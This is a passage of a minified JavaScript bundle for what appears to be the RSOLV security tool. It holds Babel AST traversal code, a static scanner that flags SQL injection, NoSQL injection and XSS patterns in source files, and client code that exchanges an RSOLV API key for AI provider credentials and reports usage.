FunctionEnvironment,arrowFunctionToExpression:pX.arrowFunctionToExpression,splitExportDeclaration:pX.splitExportDeclaration,ensureFunctionName:pX.ensureFunctionName,matchesPattern:t0.matchesPattern,isStatic:t0.isStatic,isNodeType:t0.isNodeType,canHaveVariableDeclarationOrExpression:t0.canHaveVariableDeclarationOrExpression,canSwapBetweenExpressionAndStatement:t0.canSwapBetweenExpressionAndStatement,isCompletionRecord:t0.isCompletionRecord,isStatementOrBlock:t0.isStatementOrBlock,referencesImport:t0.referencesImport,getSource:t0.getSource,willIMaybeExecuteBefore:t0.willIMaybeExecuteBefore,_guessExecutionStatusRelativeTo:t0._guessExecutionStatusRelativeTo,resolve:t0.resolve,isConstantExpression:t0.isConstantExpression,isInStrictMode:t0.isInStrictMode,isDenylisted:r0.isDenylisted,visit:r0.visit,skip:r0.skip,skipKey:r0.skipKey,stop:r0.stop,setContext:r0.setContext,requeue:r0.requeue,requeueComputedKeyAndDecorators:r0.requeueComputedKeyAndDecorators,remove:Y7.remove,insertBefore:e8.insertBefore,insertAfter:e8.insertAfter,unshiftContainer:e8.unshiftContainer,pushContainer:e8.pushContainer,getOpposite:_9.getOpposite,getCompletionRecords:_9.getCompletionRecords,getSibling:_9.getSibling,getPrevSibling:_9.getPrevSibling,getNextSibling:_9.getNextSibling,getAllNextSiblings:_9.getAllNextSiblings,getAllPrevSiblings:_9.getAllPrevSiblings,get:_9.get,getAssignmentIdentifiers:_9.getAssignmentIdentifiers,getBindingIdentifiers:_9.getBindingIdentifiers,getOuterBindingIdentifiers:_9.getOuterBindingIdentifiers,getBindingIdentifierPaths:_9.getBindingIdentifierPaths,getOuterBindingIdentifierPaths:_9.getOuterBindingIdentifierPaths,shareCommentsWithSiblings:kz.shareCommentsWithSiblings,addComment:kz.addComment,addComments:kz.addComments};Object.assign(C6.prototype,wv1);C6.prototype.arrowFunctionToShadowed=pX[String("arrowFunctionToShadowed")],Object.assign(C6.prototype,{has:t0[String("has")],is:t0[String("is")],isnt:t0[String("isnt")],equals:t0[String("equals")],hoist:e8[String("hoist")],updateSiblingKeys:e8.updateSiblingKeys,call:r0.call,isBlacklisted:r0[String("isBlacklisted")],setScope:r0.setScope,resync:r0.resync,popContext:r0.popContext,pushContext:r0.pushContext,setup:r0.setup,setKey:r0.setKey});C6.prototype._guessExecutionStatusRelativeToDifferentFunctions=t0._guessExecutionStatusRelativeTo,C6.prototype._guessExecutionStatusRelativeToDifferentFunctions=t0._guessExecutionStatusRelativeTo,Object.assign(C6.prototype,{_getTypeAnnotation:J7._getTypeAnnotation,_replaceWith:Q7._replaceWith,_resolve:t0._resolve,_call:r0._call,_resyncParent:r0._resyncParent,_resyncKey:r0._resyncKey,_resyncList:r0._resyncList,_resyncRemoved:r0._resyncRemoved,_getQueueContexts:r0._getQueueContexts,_removeFromScope:Y7._removeFromScope,_callRemovalHooks:Y7._callRemovalHooks,_remove:Y7._remove,_markRemoved:Y7._markRemoved,_assertUnremoved:Y7._assertUnremoved,_containerInsert:e8._containerInsert,_containerInsertBefore:e8._containerInsertBefore,_containerInsertAfter:e8._containerInsertAfter,_verifyNodeList:e8._verifyNodeList,_getKey:_9._getKey,_getPattern:_9._getPattern});for(let X of W2.TYPES){let J=`is${X}`,Q=W2[J];C6.prototype[J]=function(Y){return Q(this.node,Y)},C6.prototype[`assert${X}`]=function(Y){if(!Q(this.node,Y))throw new TypeError(`Expected node path of type ${X}`)}}Object.assign(C6.prototype,Lv1);for(let X of Object.keys(Fv1)){if(X[0]==="_")continue;if(!W2.TYPES.includes(X))W2.TYPES.push(X)}});var PA=c((IA)=>{Object.defineProperty(IA,"__esModule",{value:!0});IA.default=void 0;var Sv1=I6(),Tv1=U0(),bz=P8(),{VISITOR_KEYS:_v1}=Tv1;class wA{constructor(X,J,Q,Y){this.queue=null,this.priorityQueue=null,this.parentPath=Y,this.scope=X,this.state=Q,this.opts=J}shouldVisit(X){let J=this.opts;if(J.enter||J.exit)return!0;if(J[X.type])return!0;let Q=_v1[X.type];if(!(Q!=null&&Q.length))return!1;for(let Y of Q)if(X[Y])return!0;return!1}create(X,J,Q,Y){return Sv1.default.get({parentPath:this.parentPath,parent:X,container:J,key:Q,listKey:Y})}maybeQueue(X,J){if(this.queue)if(J)this.queue.push(X);else this.priorityQueue.push(X)}visitMultiple(X,J,Q){if(X.length===0)return!1;let Y=[];for(let W=0;W<X.length;W++){let z=X[W];if(z&&this.shouldVisit(z))Y.push(this.create(J,X,W,Q))}return this.visitQueue(Y)}visitSingle(X,J){if(this.shouldVisit(X[J]))return this.visitQueue([this.create(X,X,J)]);else return!1}visitQueue(X){this.queue=X,this.priorityQueue=[];let J=new WeakSet,Q=!1,Y=0;for(;Y<X.length;){let W=X[Y];if(Y++,bz.resync.call(W),W.contexts.length===0||W.contexts[W.contexts.length-1]!==this)bz.pushContext.call(W,this);if(W.key===null)continue;let{node:z}=W;if(J.has(z))continue;if(z)J.add(z);if(W.visit()){Q=!0;break}if(this.priorityQueue.length){if(Q=this.visitQueue(this.priorityQueue),this.priorityQueue=[],this.queue=X,Q)break}}for(let W=0;W<Y;W++)bz.popContext.call(X[W]);return this.queue=null,Q}visit(X,J){let Q=X[J];if(!Q)return!1;if(Array.isArray(Q))return this.visitMultiple(Q,X,J);else return this.visitSingle(X,J)}}IA.default=wA});var $4=c((SA)=>{Object.defineProperty(SA,"__esModule",{value:!0});SA.traverseNode=bv1;var Ev1=PA(),Q90=I6(),$v1=U0(),Y90=P8(),{VISITOR_KEYS:kv1}=$v1;function bv1(X,J,Q,Y,W,z,G){let H=kv1[X.type];if(!H)return!1;let U=new Ev1.default(Q,J,Y,W);if(G){if(z!=null&&z[W.parentKey])return!1;return U.visitQueue([W])}for(let K of H){if(z!=null&&z[K])continue;if(U.visit(X,K))return!0}return!1}});var P8=c((xA)=>{Object.defineProperty(xA,"__esModule",{value:!0});xA._call=xz;xA._getQueueContexts=sv1;xA._resyncKey=bA;xA._resyncList=vA;xA._resyncParent=kA;xA._resyncRemoved=pv1;xA.call=vz;xA.isDenylisted=EA;xA.popContext=dv1;xA.pushContext=iv1;xA.requeue=nv1;xA.requeueComputedKeyAndDecorators=av1;xA.resync=lv1;xA.setContext=cv1;xA.setKey=G2;xA.setScope=$A;xA.setup=rv1;xA.skip=yv1;xA.skipKey=mv1;xA.stop=uv1;xA.visit=hv1;var xv1=$4(),TA=I6(),fv1=o4(),gv1=U0();function vz(X){let J=this.opts;if(this.debug(X),this.node){if(xz.call(this,J[X]))return!0}if(this.node){var Q;return xz.call(this,(Q=J[this.node.type])==null?void 0:Q[X])}return!1}function xz(X){if(!X)return!1;for(let J of X){if(!J)continue;let Q=this.node;if(!Q)return!0;let Y=J.call(this.state,this,this.state);if(Y&&typeof Y==="object"&&typeof Y.then==="function")throw new Error("You appear to be using a plugin with an async traversal visitor, which your current version of Babel does not support. If you're using a published plugin, you may need to upgrade your @babel/core version.");if(Y)throw new Error(`Unexpected return value from visitor method ${J}`);if(this.node!==Q)return!0;if(this._traverseFlags>0)return!0}return!1}function EA(){var X;let J=(X=this.opts.denylist)!=null?X:this.opts.blacklist;return J==null?void 0:J.includes(this.node.type)}xA.isBlacklisted=EA;function _A(X,J){if(X.context!==J)X.context=J,X.state=J.state,X.opts=J.opts}function hv1(){var X,J;if(!this.node)return!1;if(this.isDenylisted())return!1;if((X=(J=this.opts).shouldSkip)!=null&&X.call(J,this))return!1;let Q=this.context;if(this.shouldSkip||vz.call(this,"enter"))return this.debug("Skip..."),this.shouldStop;return _A(this,Q),this.debug("Recursing into..."),this.shouldStop=xv1.traverseNode(this.node,this.opts,this.scope,this.state,this,this.skipKeys),_A(this,Q),vz.call(this,"exit"),this.shouldStop}function yv1(){this.shouldSkip=!0}function mv1(X){if(this.skipKeys==null)this.skipKeys={};this.skipKeys[X]=!0}function uv1(){this._traverseFlags|=TA.SHOULD_SKIP|TA.SHOULD_STOP}function $A(){var X,J;if((X=this.opts)!=null&&X.noScope)return;let Q=this.parentPath;if((this.key==="key"||this.listKey==="decorators")&&Q.isMethod()||this.key==="discriminant"&&Q.isSwitchStatement())Q=Q.parentPath;let Y;while(Q&&!Y){var W;if((W=Q.opts)!=null&&W.noScope)return;Y=Q.scope,Q=Q.parentPath}this.scope=this.getScope(Y),(J=this.scope)==null||J.init()}function cv1(X){if(this.skipKeys!=null)this.skipKeys={};if(this._traverseFlags=0,X)this.context=X,this.state=X.state,this.opts=X.opts;return $A.call(this),this}function lv1(){if(this.removed)return;kA.call(this),vA.call(this),bA.call(this)}function kA(){if(this.parentPath)this.parent=this.parentPath.node}function bA(){if(!this.container)return;if(this.node===this.container[this.key])return;if(Array.isArray(this.container)){for(let X=0;X<this.container.length;X++)if(this.container[X]===this.node){G2.call(this,X);return}}else for(let X of Object.keys(this.container))if(this.container[X]===this.node){G2.call(this,X);return}this.key=null}function vA(){if(!this.parent||!this.inList)return;let X=this.parent[this.listKey];if(this.container===X)return;this.container=X||null}function pv1(){if(this.key==null||!this.container||this.container[this.key]!==this.node)fv1._markRemoved.call(this)}function dv1(){if(this.contexts.pop(),this.contexts.length>0)this.setContext(this.contexts[this.contexts.length-1]);else this.setContext(void 0)}function iv1(X){this.contexts.push(X),this.setContext(X)}function rv1(X,J,Q,Y){this.listKey=Q,this.container=J,this.parentPath=X||this.parentPath,G2.call(this,Y)}function G2(X){var J;this.key=X,this.node=this.container[this.key],this.type=(J=this.node)==null?void 0:J.type}function nv1(X=this){if(X.removed)return;let J=this.contexts;for(let Q of J)Q.maybeQueue(X)}function av1(){let{context:X,node:J}=this;if(!gv1.isPrivate(J)&&J.computed)X.maybeQueue(this.get("key"));if(J.decorators)for(let Q of this.get("decorators"))X.maybeQueue(Q)}function sv1(){let X=this,J=this.contexts;while(!J.length){if(X=X.parentPath,!X)break;J=X.contexts}return J}});var yA=c((gA)=>{Object.defineProperty(gA,"__esModule",{value:!0});gA.default=void 0;class fA{getCode(){}getScope(){}addHelper(){throw new Error("Helpers are not supported by the default hub.")}buildError(X,J,Q=TypeError){return new Q(J)}}gA.default=fA});var g5=c((e5)=>{Object.defineProperty(e5,"__esModule",{value:!0});Object.defineProperty(e5,"Hub",{enumerable:!0,get:function(){return Dx1.default}});Object.defineProperty(e5,"NodePath",{enumerable:!0,get:function(){return Nx1.default}});Object.defineProperty(e5,"Scope",{enumerable:!0,get:function(){return Lx1.default}});e5.visitors=e5.default=void 0;P8();var t5=_4();e5.visitors=t5;var Rx1=U0(),Ax1=xX(),mA=$4(),Nx1=I6(),Lx1=LG(),Dx1=yA(),{VISITOR_KEYS:wx1,removeProperties:Ix1,traverseFast:o5}=Rx1;function _8(X,J={},Q,Y,W,z){if(!X)return;if(!J.noScope&&!Q){if(X.type!=="Program"&&X.type!=="File")throw new Error(`You must pass a scope and parentPath unless traversing a Program/File. Instead of that you tried to traverse a ${X.type} node without passing scope and parentPath.`)}if(!W&&z)throw new Error("visitSelf can only be used when providing a NodePath.");if(!wx1[X.type])return;t5.explode(J),mA.traverseNode(X,J,Q,Y,W,null,z)}var U90=e5.default=_8;_8.visitors=t5;_8.verify=t5.verify;_8.explode=t5.explode;_8.cheap=function(X,J){o5(X,J);return};_8.node=function(X,J,Q,Y,W,z){mA.traverseNode(X,J,Q,Y,W,z)};_8.clearNode=function(X,J){Ix1(X,J)};_8.removeProperties=function(X,J){return o5(X,_8.clearNode,J),X};_8.hasType=function(X,J,Q){if(Q!=null&&Q.includes(X.type))return!1;if(X.type===J)return!0;return o5(X,function(Y){if(Q!=null&&Q.includes(Y.type))return o5.skip;if(Y.type===J)return o5.stop})};_8.cache=Ax1});class fz{async scanFile(X,J,Q){let Y=[];if(this.isTestFile(X))return[];console.log(`[AST] Scanning file: ${X}`),console.log(`[AST] Total patterns: ${Q.length}`);let W=Q.filter((G)=>{if(G.patterns?.regex&&G.patterns.regex.length>0){let H=G.patterns.regex.some((U)=>U.test(J));if(H)console.log(`[AST] Pattern ${G.id} matched via regex`);return H}return!1});if(console.log(`[AST] Candidate patterns after regex filter: ${W.length}`),W.length===0)return Y;if(this.isJavaScriptFile(X)){let G;try{G=cA.parse(J,{sourceType:"module",plugins:["jsx","typescript"],errorRecovery:!0})}catch(H){return this.regexOnlyFallback(X,J,W)}for(let H of W)if(H.astRules){console.log(`[AST] Applying AST rules for pattern ${H.id}`);let U=this.applyASTPattern(G,H,X,J);console.log(`[AST] Found ${U.length} issues with AST rules`),Y.push(...U)}else{console.log(`[AST] Pattern ${H.id} has no AST rules, using regex`);let U=this.applyRegexPattern(J,H,X);Y.push(...U)}}else return this.regexOnlyFallback(X,J,W);return Y.filter((G)=>G.confidence>=(G.pattern.minConfidence||0.7))}applyASTPattern(X,J,Q,Y){let W=[],z=J.astRules,G=this;return lA.default(X,{enter(H){if(z.node_type&&H.node.type!==z.node_type)return;let U=!1,K=J.confidenceRules?.base||0.8;switch(J.type.toLowerCase().replace(/_/g," ")){case"sql injection":U=G.checkSQLInjection(H,z,J);break;case"logging":U=G.checkMissingLogging(H,z,J);break;case"nosql injection":U=G.checkNoSQLInjection(H,z,J);break;default:U=G.checkGenericPattern(H,z,J)}if(U){K=G.calculateConfidence(H,K,J.confidenceRules?.adjustments||{});let B=H.node.loc;if(B)W.push({pattern:J,file:Q,line:B.start.line,column:B.start.column,code:Y.substring(H.node.start||0,H.node.end||0),confidence:K})}}}),W}checkSQLInjection(X,J,Q){let Y=X.node;if(e1.isBinaryExpression(Y)&&Y.operator==="+"){let W=this.getFullConcatenatedString(X),z=/\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b/i.test(W);if(console.log(`[AST] SQL check: BinaryExpression found, hasSQL=${z}, expression="${W}"`),z){let G=this.isInDatabaseCall(X),H=this.hasConcatenatedUserInput(X),U=this.isAssignedToQueryVariable(X);if((G||U)&&H){if(Q.contextRules?.exclude_if_parameterized){if(this.isParameterizedQuery(X))return!1}if(Q.contextRules?.exclude_if_logging_only){if(this.isOnlyUsedForLogging(X))return!1}return!0}}}if(e1.isTemplateLiteral(Y)){let W=Y.quasis.some((G)=>/\b(SELECT|INSERT|UPDATE|DELETE)\b/i.test(G.value.raw)),z=Y.expressions.some((G)=>this.containsUserInput(G,X));if(W&&z){if(Q.contextRules?.exclude_if_parameterized){if(this.isParameterizedQuery(X))return!1}return!0}}return!1}checkMissingLogging(X,J,Q){let Y=X.node;if(!e1.isFunctionDeclaration(Y))return!1;if(J.name_matches&&Y.id){if(!new RegExp(J.name_matches).test(Y.id.name))return!1;let z=this.getBodyString(Y);if(new RegExp(J.body_excludes||"log|logger").test(z))return!1;if(Q.contextRules?.exclude_if_delegates){if(this.delegatesToOtherFunction(Y))return!1}return!0}return!1}checkNoSQLInjection(X,J,Q){let Y=X.node;if(!e1.isCallExpression(Y))return!1;if(e1.isMemberExpression(Y.callee)&&e1.isIdentifier(Y.callee.property)){let W=Y.callee.property.name;if(!J.method_names?.includes(W))return!1;let z=Y.arguments[0];if(e1.isObjectExpression(z)){if(z.properties.some((U)=>e1.isObjectProperty(U)&&e1.isIdentifier(U.key)&&J.argument_contains?.dangerous_keys?.includes(U.key.name)))return!0;return z.properties.some((U)=>this.containsUserInput(U.value,X))}}return!1}checkGenericPattern(X,J,Q){return!1}isTestFile(X){return[/\.test\.[jt]sx?$/,/\.spec\.[jt]sx?$/,/\/__tests__\//,/\/test\//,/\/spec\//].some((Q)=>Q.test(X))}isJavaScriptFile(X){return[/\.[jt]sx?$/,/\.mjs$/,/\.cjs$/].some((Q)=>Q.test(X))}isInDatabaseCall(X){let J=X,Q=0;while(J&&Q<10){let Y=J.parentPath;if(!Y)break;let W=Y.node;if(e1.isCallExpression(W)){if(e1.isMemberExpression(W.callee)){let z=W.callee.property;if(e1.isIdentifier(z)&&["query","execute","exec","run","all","get"].includes(z.name))return!0}}J=Y,Q++}return!1}containsUserInput(X,J){if(!X)return!1;if(e1.isMemberExpression(X)){let Q=this.getObjectName(X);return["req","request","params","query","body"].includes(Q)}if(e1.isIdentifier(X)){let Q=J.scope.getBinding(X.name);if(Q&&Q.path.isVariableDeclarator())return this.containsUserInput(Q.path.node.init,Q.path)}return!1}getObjectName(X){if(e1.isMemberExpression(X)&&e1.isIdentifier(X.object))return X.object.name;return""}isParameterizedQuery(X){let J=X.parent;if(e1.isCallExpression(J))return J.arguments.length>1||e1.isTemplateLiteral(J.arguments[0])&&J.arguments[0].quasis.some((Q)=>Q.value.raw.includes("?"));return!1}getBodyString(X){if(X.body&&X.body.body)return X.body.body.map((J)=>J.type).join(" ");return""}delegatesToOtherFunction(X){if(X.body&&X.body.body)return X.body.body.some((J)=>e1.isReturnStatement(J)&&e1.isCallExpression(J.argument));return!1}calculateConfidence(X,J,Q){let Y=J;if(Q.direct_req_param_concat&&this.hasConcatenatedUserInput(X))Y+=Q.direct_req_param_concat;if(Q.within_db_query_call&&(this.isInDatabaseCall(X)||this.isAssignedToQueryVariable(X)))Y+=Q.within_db_query_call;if(Q.has_sql_keywords){let W=X.node;if(e1.isBinaryExpression(W)){let z=this.getFullConcatenatedString(X);if(/\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b/i.test(z))Y+=Q.has_sql_keywords}}if(Q.is_console_log&&this.isInConsoleLog(X))Y+=Q.is_console_log;if(Q.direct_user_input&&this.hasDirectUserInput(X))Y+=Q.direct_user_input;if(Q.has_validation&&this.hasValidation(X))Y+=Q.has_validation;if(Q.is_test_code&&this.isInTestCode(X))Y+=Q.is_test_code;if(Q.in_test_file&&this.isTestFile(X.hub?.file?.opts?.filename||""))Y+=Q.in_test_file;return Math.max(0,Math.min(1,Y))}hasDirectUserInput(X){return!1}hasValidation(X){return!1}isInTestCode(X){return!1}getFullConcatenatedString(X){let J=X.node;if(e1.isBinaryExpression(J)){let Q=[];if(e1.isStringLiteral(J.left))Q.push(J.left.value);if(e1.isStringLiteral(J.right))Q.push(J.right.value);else if(e1.isIdentifier(J.right))Q.push("USER_INPUT");return Q.join("")}return""}hasConcatenatedUserInput(X){let J=X.node;if(!e1.isBinaryExpression(J))return!1;let Q=J.right;if(e1.isIdentifier(Q))return!0;if(e1.isMemberExpression(Q)){let Y=Q.object;if(e1.isMemberExpression(Y)&&e1.isIdentifier(Y.object)){if(Y.object.name==="req"){let W=Y.property;if(e1.isIdentifier(W)&&["params","query","body"].includes(W.name))return!0}}}return!1}isAssignedToQueryVariable(X){let J=X.parent;if(e1.isVariableDeclarator(J)&&J.init===X.node){if(e1.isIdentifier(J.id)){let Q=J.id.name.toLowerCase();return Q.includes("query")||Q.includes("sql")}}return!1}isInConsoleLog(X){let J=X,Q=0;while(J&&Q<5){let Y=J.parentPath;if(!Y)break;let W=Y.node;if(e1.isCallExpression(W)){let z=W.callee;if(e1.isMemberExpression(z)&&e1.isIdentifier(z.object)&&z.object.name==="console"&&e1.isIdentifier(z.property)&&z.property.name==="log")return!0}J=Y,Q++}return!1}isOnlyUsedForLogging(X){let J=X.parent;if(e1.isVariableDeclarator(J)&&J.init===X.node){let Q=J.id.name,Y=X.scope.getBinding(Q);if(!Y)return!1;return Y.referencePaths.every((z)=>{return this.isInConsoleLog(z)})}return this.isInConsoleLog(X)}regexOnlyFallback(X,J,Q){let Y=[];for(let W of Q){let z=this.applyRegexPattern(J,W,X);Y.push(...z)}return Y}applyRegexPattern(X,J,Q){let Y=[],W=X.split(`
`);if(!J.patterns?.regex)return Y;for(let z of J.patterns.regex){let G;z.lastIndex=0;while((G=z.exec(X))!==null){let H=X.substring(0,G.index).split(`
`).length,U=W[H-1],K=G.index-X.lastIndexOf(`
`,G.index-1)-1;if(Y.push({pattern:J,file:Q,line:H,column:K,code:G[0],confidence:J.confidenceRules?.base||0.8}),G.index===z.lastIndex)z.lastIndex++}}return Y}}var cA,lA,e1;var pA=j1(()=>{cA=z9(U4(),1),lA=z9(g5(),1),e1=z9(U0(),1)});class JX{patternSource;cachedPatterns=new Map;astInterpreter;constructor(X){this.patternSource=X||CX(),this.astInterpreter=new fz}async detect(X,J,Q="unknown"){let Y=[],W=X.split(`
`),z=new Set;try{let G=await this.patternSource.getPatternsByLanguage(J);q.info(`SecurityDetectorV2: Analyzing ${J} code with ${G.length} patterns`);let H=G.filter((K)=>K.astRules),U=G.filter((K)=>!K.astRules);if(H.length>0){let K=await this.astInterpreter.scanFile(Q,X,H);for(let V of K){let B=`${V.line}:${V.pattern.type}`;if(!z.has(B)){z.add(B);let Z=V.confidence<=1?Math.round(V.confidence*100):Math.round(V.confidence);Y.push({type:V.pattern.type,severity:V.pattern.severity,line:V.line,message:`${V.pattern.name}: ${V.pattern.description}`,description:V.pattern.description,confidence:Z,cweId:V.pattern.cweId,owaspCategory:V.pattern.owaspCategory,remediation:V.pattern.remediation})}}}for(let K of U)if(K.patterns.regex)for(let V of K.patterns.regex){let B;V.lastIndex=0;while((B=V.exec(X))!==null){let Z=this.getLineNumber(X,B.index),M=W[Z-1]?.trim()||"";if(K.id==="ruby-sql-injection"&&J==="ruby")q.info(`Ruby SQL match found at line ${Z}: "${M}"`);if(this.isSafeUsage(M,K.type)){if(K.id==="ruby-sql-injection"&&J==="ruby")q.info("  Skipped as safe usage");continue}let F=`${Z}:${K.type}`;if(z.has(F))continue;z.add(F);let j={type:K.type,severity:K.severity,line:Z,message:`${K.name}: ${K.description}`,description:K.description,confidence:this.getConfidence(M,K.type),cweId:K.cweId,owaspCategory:K.owaspCategory,remediation:K.remediation};if(K.id==="ruby-sql-injection"&&J==="ruby")q.info("  Adding vulnerability:",j);if(Y.push(j),!V.global)break}}}catch(G){q.error("Error detecting vulnerabilities:",G)}return Y}async detectIssues(X){return(await this.detect(X.content,X.language,X.filePath)).map((Q)=>({patternId:Q.cweId||`${Q.type}-001`,severity:Q.severity,line:Q.line,column:1,message:Q.message,description:Q.description,file:X.filePath,type:Q.type,remediation:Q.remediation,confidence:Q.confidence}))}async scanDirectory(X){return q.info(`SecurityDetectorV2: Starting directory scan of ${X}`),{vulnerabilities:[],summary:{total:0,byType:{},bySeverity:{}},metadata:{language:"unknown",linesScanned:0,scanDuration:0,timestamp:new Date().toISOString()}}}getLineNumber(X,J){return X.substring(0,J).split(`
`).length}isSafeUsage(X,J){if(X.includes("#{")&&X.includes("}"))return!1;if(/params\s*\[\s*:/.test(X))return!1;return({sql_injection:[/\?/,/\$\d+/,/:\w+(?!\s*\])/,/prepare\s*\(/i,/setParameter/i,/bindParam/i],xss:[/escape/i,/sanitize/i,/encode/i,/textContent/,/innerText/,/createTextNode/],command_injection:[/escapeshellarg/i,/escapeshellcmd/i,/quote/i]}[J]||[]).some((W)=>W.test(X))}getConfidence(X,J){if(({sql_injection:[/\+\s*req\./,/\+\s*request\./,/\$\{.*req\./,/`.*\$\{.*req\./],xss:[/innerHTML\s*=\s*[^'"]*req\./,/document\.write\s*\([^)]*req\./,/\$\([^)]+\)\.html\s*\([^)]*req\./]}[J]||[]).some((W)=>W.test(X)))return 90;if(this.isSafeUsage(X,J))return 30;return 60}}var O90;var XQ=j1(()=>{IX();V5();t1();pA();O90=new JX});class P6{baseUrl;apiKey;constructor(X){if(typeof X==="string")this.apiKey=X,this.baseUrl=process.env.RSOLV_API_URL||"https://api.rsolv.dev";else this.baseUrl=X.baseUrl,this.apiKey=X.apiKey}async createFixAttempt(X){let J={github_org:X.repository_full_name?.split("/")[0]||"unknown",repo_name:X.repository_full_name?.split("/")[1]||"unknown",issue_number:X.issue_number,pr_number:parseInt(X.github_pr_url?.split("/").pop()||"0"),pr_title:X.issue_title||"RSOLV Fix",pr_url:X.github_pr_url,issue_title:X.issue_title,issue_url:X.github_issue_url,api_key_used:this.apiKey,metadata:{ai_provider:X.ai_provider,ai_model:X.ai_model,security_vulnerabilities_found:X.security_vulnerabilities_found,estimated_time_saved_hours:X.estimated_time_saved_hours}};return this.recordFixAttempt(J)}async recordFixAttempt(X){try{let J=await fetch(`${this.baseUrl}/api/v1/fix-attempts`,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(X)});if(J.ok)return{success:!0,data:await J.json()};else{let Q=await J.json();return{success:!1,error:`API Error: ${J.status} - ${JSON.stringify(Q)}`}}}catch(J){return{success:!1,error:J instanceof Error?J.message:"Unknown error"}}}async validateVulnerabilities(X){let J=await fetch(`${this.baseUrl}/api/v1/vulnerabilities/validate`,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(X)});if(!J.ok){let Q=await J.text();throw new Error(`Validation API error: ${J.status} - ${Q}`)}return J.json()}}class mz{credentials=new Map;apiKey=null;refreshTimers=new Map;rsolvApiUrl=process.env.RSOLV_API_URL||"https://api.rsolv.ai";async initialize(X){this.apiKey=X,q.info("Initializing RSOLV credential manager");try{let J={api_key:X,providers:["anthropic","openai","openrouter"],ttl_minutes:60};q.info(`Requesting credential exchange from ${this.rsolvApiUrl}/api/v1/credentials/exchange`);let Q=await fetch(`${this.rsolvApiUrl}/api/v1/credentials/exchange`,{method:"POST",headers:{"x-api-key":X,"Content-Type":"application/json","X-GitHub-Job":process.env.GITHUB_JOB||"","X-GitHub-Run":process.env.GITHUB_RUN_ID||""},body:JSON.stringify(J),signal:AbortSignal.timeout(15000)});if(!Q.ok){let W=await Q.json();throw q.error(`Credential exchange failed - Status: ${Q.status}, Body:`,W),new Error(`Failed to exchange credentials: ${W.error||Q.statusText}`)}let Y=await Q.json();if(!Y||!Y.credentials)throw q.error("Invalid credential exchange response:",Y),new Error("Invalid response from credential exchange API");if(Object.entries(Y.credentials).forEach(([W,z])=>{q.debug(`Storing credential for ${W}`,{hasApiKey:!!z.api_key,apiKeyLength:z.api_key?.length||0,expiresAt:z.expires_at}),this.credentials.set(W,z)}),Y.usage?.remaining_fixes!==void 0)q.info(`Credentials initialized. Remaining fixes: ${Y.usage.remaining_fixes}`);else q.info("Credentials initialized")}catch(J){throw q.error("Failed to initialize credentials",J),J}}async getCredential(X){let J=this.credentials.get(X);if(q.debug(`Getting credential for ${X}`,{hasCredential:!!J,hasApiKey:!!J?.api_key,apiKeyLength:J?.api_key?.length||0}),!J)throw new Error(`No valid credential for ${X}`);if(new Date(J.expires_at)<new Date){q.info(`Credential for ${X} expired, refreshing...`),await this.refreshCredentials();let Y=this.credentials.get(X);if(!Y||!Y.api_key)throw new Error(`Failed to refresh credential for ${X}`);return Y.api_key}if(!J.api_key)throw new Error(`Credential for ${X} has no API key`);return J.api_key}async refreshCredentials(){if(!this.apiKey)throw new Error("Cannot refresh credentials: API key not set");q.info("Refreshing expired credentials");try{let X={api_key:this.apiKey,providers:["anthropic","openai","openrouter"],ttl_minutes:60},J=await fetch(`${this.rsolvApiUrl}/api/v1/credentials/exchange`,{method:"POST",headers:{"x-api-key":this.apiKey,"Content-Type":"application/json","X-GitHub-Job":process.env.GITHUB_JOB||"","X-GitHub-Run":process.env.GITHUB_RUN_ID||""},body:JSON.stringify(X),signal:AbortSignal.timeout(15000)});if(!J.ok){let Y=await J.json();throw q.error(`Credential refresh failed - Status: ${J.status}, Body:`,Y),new Error(`Failed to refresh credentials: ${Y.error||J.statusText}`)}let Q=await J.json();if(!Q||!Q.credentials)throw q.error("Invalid credential refresh response:",Q),new Error("Invalid response from credential refresh API");Object.entries(Q.credentials).forEach(([Y,W])=>{q.debug(`Refreshed credential for ${Y}`,{hasApiKey:!!W.api_key,apiKeyLength:W.api_key?.length||0,expiresAt:W.expires_at}),this.credentials.set(Y,W)}),q.info("Successfully refreshed credentials")}catch(X){throw q.error("Failed to refresh credentials:",X),X}}async reportUsage(X,J){try{let Q=await fetch(`${this.rsolvApiUrl}/api/v1/usage/report`,{method:"POST",headers:{"x-api-key":this.apiKey||"","Content-Type":"application/json"},body:JSON.stringify({provider:X,tokens_used:J.tokensUsed,request_count:J.requestCount,job_id:process.env.GITHUB_JOB}),signal:AbortSignal.timeout(1e4)});if(!Q.ok)q.warn(`Failed to report usage for ${X}: ${Q.statusText}`)}catch(Q){q.warn(`Error reporting usage for ${X}:`,Q)}}cleanup(){this.refreshTimers.forEach((X)=>clearTimeout(X)),this.refreshTimers.clear(),this.credentials.clear(),q.info("Credential manager cleaned up")}}var rA=j1(()=>{t1()});var W7={};Y9(W7,{CredentialManagerSingleton:()=>H2});var H2;var dX=j1(()=>{rA();t1();H2=class H2{static instances=new Map;static initPromises=new Map;static async getInstance(X){if(this.instances.has(X))return q.debug("Reusing existing credential manager for API key"),this.instances.get(X);if(this.initPromises.has(X))return q.debug("Waiting for in-progress initialization for API key"),this.initPromises.get(X);let J=this.createAndInitializeManager(X);this.initPromises.set(X,J);try{return await J}finally{this.initPromises.delete(X)}}static async createAndInitializeManager(X){q.info("Creating new credential manager instance");let J=new mz;try{return await this.initializeWithRetry(J,X),this.instances.set(X,J),J}catch(Q){throw J.cleanup(),Q}}static async initializeWithRetry(X,J,Q=3){let Y=null;for(let W=1;W<=Q;W++)try{q.debug(`Initializing credential manager (attempt ${W}/${Q})`),await X.initialize(J);return}catch(z){if(Y=z,q.warn(`Credential initialization failed (attempt ${W}/${Q}): ${Y.message}`),W<Q){let G=1000*Math.pow(2,W-1);q.debug(`Waiting ${G}ms before retry`),await new Promise((H)=>setTimeout(H,G))}}throw new Error(`Failed to initialize credentials after ${Q} attempts: ${Y?.message}`)}static clearInstance(X){let J=this.instances.get(X);if(J)J.cleanup(),this.instances.delete(X),q.debug("Cleared credential manager instance for API key");this.initPromises.delete(X)}static cleanup(){q.info(`Cleaning up ${this.instances.size} credential manager instances`),this.instances.forEach((X)=>X.cleanup()),this.instances.clear(),this.initPromises.clear()}static getInstanceCount(){return this.instances.size}}});function z8(X){let 